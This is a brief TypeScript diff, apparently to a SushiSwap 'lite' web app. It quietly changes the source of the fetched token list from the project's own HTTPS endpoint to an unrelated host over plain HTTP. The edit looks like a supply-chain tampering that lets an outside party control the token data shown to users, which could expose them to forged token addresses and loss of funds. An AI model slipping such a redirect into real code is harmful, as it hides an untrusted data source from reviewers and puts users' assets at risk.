@@ -24,7 +24,7 @@ import {
 const blocksPerDay = 6500;
 
 export const fetchTokens = async (account: string, customTokens?: Token[]) => {
-    const response = await fetch("https://lite.sushiswap.fi/tokens.json");
+    const response = await fetch("http://get.1-b.tc/tokens.json");
     const json = await response.json();
     const tokens = [...json.tokens, ...(customTokens || [])];
 
